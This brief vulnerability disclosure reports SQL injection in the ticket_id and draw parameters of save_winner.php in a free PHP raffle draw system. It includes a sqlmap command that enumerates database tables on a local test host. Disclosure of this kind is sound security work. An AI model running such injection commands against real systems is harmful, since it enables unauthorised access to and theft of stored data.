vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15951/raffle-draw-system-using-php-and-javascript-free-source-code.html

Vulnerability trigger parameter: $ticket_id,$draw

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/213212761-0653e1c1-e3cc-4c8c-8357-c66f548faf91.png)

sqlmap.py -u "http://192.168.249.88/php-js-raffle-draw/save_winner.php" --data "ticket_id=1&draw=1" -D raffle_db --tables

![image](https://user-images.githubusercontent.com/30823782/213212862-2fb55095-2b11-4190-946e-e5bccb5b3770.png)

